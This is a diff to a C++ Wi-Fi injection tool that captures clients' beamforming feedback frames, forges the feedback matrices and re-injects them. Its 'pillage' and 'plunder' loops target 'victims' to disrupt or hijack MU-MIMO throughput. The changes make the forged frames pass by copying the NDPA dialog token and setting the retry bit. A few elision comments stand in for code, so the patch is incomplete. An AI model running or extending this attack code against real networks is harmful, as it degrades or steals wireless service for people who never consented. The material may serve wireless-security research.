@@ -104,7 +104,8 @@ std::string Injector::build_bpf(const std::vector<ClientInfo>& targets,
     // Capture management action frames from all target MACs
     // plus NDP announcements from any AP (for timing)
     std::ostringstream ss;
-    ss << "(type mgt and not (subtype beacon or subtype probe-req "
+    ss << "((type control and subtype ndpa) and wlan addr2 " << ap_.bssid << ") or "
+       << "(type mgt and not (subtype beacon or subtype probe-req "
        << "or subtype probe-resp or subtype assoc-req or subtype assoc-resp "
        << "or subtype reassoc-req or subtype reassoc-resp "
        << "or subtype auth or subtype deauth or subtype disassoc) and (";
@@ -127,19 +128,16 @@ bool Injector::inject_forged(const uint8_t* genuine_pkt,
                               int genuine_len,
                               const uint8_t* forged_feedback,
                               int feedback_len,
-                              int feedback_offset_in_frame) {
-    // genuine_pkt starts with radiotap header
+                              int feedback_offset_in_frame,
+                              uint8_t dialog_token) {
     uint16_t rt_len = genuine_pkt[2] | (genuine_pkt[3] << 8);
     int mac_offset  = rt_len;
     int fcs_len     = 4;
 
-    int full_total = RADIOTAP_HDR_LEN
-                   + (genuine_len - mac_offset - fcs_len);
-
-    // Cap frame size to interface MTU + radiotap header length.
-    // Frames exceeding this are silently dropped by the kernel.
-    // MTU is set to 2304 at startup giving max injectable of 2316 bytes.
+    int full_total = RADIOTAP_HDR_LEN + (genuine_len - mac_offset - fcs_len);
     int iface_mtu = 1500;
+    
+    // MTU fetch block remains the same...
     {
         struct ifreq ifr;
         int sock = socket(AF_INET, SOCK_DGRAM, 0);
@@ -153,15 +151,16 @@ bool Injector::inject_forged(const uint8_t* genuine_pkt,
     int forged_total = std::min(full_total, iface_mtu + RADIOTAP_HDR_LEN);
 
     std::vector<uint8_t> buf(forged_total, 0);
-
-    // Prepend our radiotap header
     memcpy(buf.data(), RADIOTAP_HDR, RADIOTAP_HDR_LEN);
+    int copy_len = std::min(genuine_len - mac_offset - fcs_len, forged_total - RADIOTAP_HDR_LEN);
+    memcpy(buf.data() + RADIOTAP_HDR_LEN, genuine_pkt + mac_offset, copy_len);
 
-    // Copy 802.11 MAC header + as much frame body as fits
-    int copy_len = std::min(genuine_len - mac_offset - fcs_len,
-                             forged_total - RADIOTAP_HDR_LEN);
-    memcpy(buf.data() + RADIOTAP_HDR_LEN,
-           genuine_pkt + mac_offset, copy_len);
+    // FIX 1: Set the Retry Bit in the MAC Header (Byte 1, Bit 3 = 0x08)
+    buf[RADIOTAP_HDR_LEN + 1] |= 0x08;
+
+    // FIX 2: Set the correct Dialog Token in the Action Frame body
+    // Category(1) + Action(1) + Dialog Token(1) -> Offset 2 within body
+    buf[RADIOTAP_HDR_LEN + 24 + 2] = dialog_token;
 
     // Overwrite feedback matrix bytes with forged content
     int fb_start = RADIOTAP_HDR_LEN + 24 + feedback_offset_in_frame;
@@ -173,7 +172,6 @@ bool Injector::inject_forged(const uint8_t* genuine_pkt,
     int res = pcap_inject(send_handle_, buf.data(), forged_total);
     return res == forged_total;
 }
-
 // ---------------------------------------------------------------------------
 // Pillage attack loop
 // ---------------------------------------------------------------------------
@@ -208,15 +206,30 @@ void Injector::run_pillage(const std::vector<ClientInfo>& victims,
 
     struct pcap_pkthdr* hdr;
     const uint8_t* pkt;
+    uint8_t current_dialog_token = 0;
 
     while (running_) {
         int r = pcap_next_ex(sniff_handle_, &hdr, &pkt);
         if (r != 1) continue;
 
         uint16_t rt_len = pkt[2] | (pkt[3] << 8);
-        if ((int)hdr->caplen < rt_len + 24) continue;
+        if ((int)hdr->caplen < rt_len + 16) continue; // Minimum length for NDPA MAC hdr
 
         const uint8_t* mac_hdr = pkt + rt_len;
+        uint8_t fc0 = mac_hdr[0];
+
+        // CHECK FOR NDPA: Control Frame (Type 1), Subtype 5 (NDPA)
+        // FC byte 0 = 0x54 (0101 0100)
+        if ((fc0 & 0xFC) == 0x54) {
+            // In NDPA, Address 2 (TA) is AP MAC, Dialog Token is at offset 16
+            if ((int)hdr->caplen >= rt_len + 17) {
+                current_dialog_token = pkt[rt_len + 16];
+            }
+            continue; // Go back to sniffing for the client's BFI
+        }
+
+        // If it's not NDPA, process it as a BFI Action Frame
+        if ((int)hdr->caplen < rt_len + 24) continue;
         const uint8_t* ta      = mac_hdr + 10;
         std::string ta_str     = mac_to_str(ta);
 
@@ -227,8 +240,6 @@ void Injector::run_pillage(const std::vector<ClientInfo>& victims,
 
         BFIParams detected;
         if (!bfi_detect(body, body_len, detected)) continue;
-
-        // Verify parameters match what we detected at startup
         if (detected.Nr != params.Nr || detected.Nc != params.Nc) continue;
 
         const uint8_t* fb_bytes = body + fb_off;
@@ -239,9 +250,10 @@ void Injector::run_pillage(const std::vector<ClientInfo>& victims,
         FeedbackMatrix forged  = bfi_forge_disrupt(genuine, params);
         bfi_compress(forged, params, forged_buf.data());
 
+        // FIX 3: Pass the current_dialog_token to the injection
         bool ok = inject_forged(pkt, (int)hdr->caplen,
                                 forged_buf.data(), params.feedback_len,
-                                fb_off);
+                                fb_off, current_dialog_token);
 
         double compute_ms = now_ms() - t0;
 
@@ -254,7 +266,6 @@ void Injector::run_pillage(const std::vector<ClientInfo>& victims,
         InjectSample sample{ta_str, compute_ms, ok};
         if (cb) cb({sample});
     }
-
     close_handles();
 }
 
@@ -296,14 +307,28 @@ void Injector::run_plunder(const std::vector<ClientInfo>& victims,
     struct pcap_pkthdr* hdr;
     const uint8_t* pkt;
 
+    uint8_t current_dialog_token = 0; // Track token here too
+    
     while (running_) {
         int r = pcap_next_ex(sniff_handle_, &hdr, &pkt);
         if (r != 1) continue;
 
         uint16_t rt_len = pkt[2] | (pkt[3] << 8);
-        if ((int)hdr->caplen < rt_len + 24) continue;
+        if ((int)hdr->caplen < rt_len + 16) continue; 
 
         const uint8_t* mac_hdr = pkt + rt_len;
+        uint8_t fc0 = mac_hdr[0];
+
+        // CHECK FOR NDPA
+        if ((fc0 & 0xFC) == 0x54) {
+            if ((int)hdr->caplen >= rt_len + 17) {
+                current_dialog_token = pkt[rt_len + 16];
+            }
+            continue; 
+        }
+
+        if ((int)hdr->caplen < rt_len + 24) continue;
+        // ... (existing ta_str check logic) ...
         const uint8_t* ta      = mac_hdr + 10;
         std::string ta_str     = mac_to_str(ta);
 
@@ -323,7 +348,6 @@ void Injector::run_plunder(const std::vector<ClientInfo>& victims,
             continue;
         }
 
-        // Only process victim frames once we have a QM matrix to forge against
         if (!victim_map.count(ta_str)) continue;
         if (!qm_ready) continue;
 
@@ -333,10 +357,10 @@ void Injector::run_plunder(const std::vector<ClientInfo>& victims,
         FeedbackMatrix forged  = bfi_forge_plunder(genuine, qm_matrix, params);
         bfi_compress(forged, params, forged_buf.data());
 
+        // FIX 3: Inject with the active dialog token
         bool ok = inject_forged(pkt, (int)hdr->caplen,
                                 forged_buf.data(), params.feedback_len,
-                                fb_off);
-
+                                fb_off, current_dialog_token);
         double compute_ms = now_ms() - t0;
 
         stats_.total_broadsides++;
